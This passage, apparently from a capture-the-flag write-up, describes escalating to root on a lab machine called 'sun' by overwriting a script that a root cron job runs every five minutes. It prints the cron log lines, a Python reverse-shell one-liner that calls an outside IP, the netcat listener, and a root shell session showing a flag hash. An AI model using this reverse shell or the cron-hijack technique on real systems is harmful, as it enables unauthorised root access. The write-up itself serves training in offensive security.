Aug  5 03:30:01 sun CRON[11472]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>

<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:35:01 sun CRON[21608]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>

<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:40:01 sun CRON[31742]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>

</code></pre></div></div>

<p>This cron runs every 5. Why don’t we edit <code class="highlighter-rouge">/home/sun/Documents/script.py</code> like this?</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.172",41337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sun</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">script</span><span class="o">.</span><span class="n">py</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 10.10.14.35 41337
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# ls
root.txt
script.py
# cat root.txt
ba1d0019200a54e370ca151007a8095a
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /home
sun
# ^C
</span></code></pre></div></div>
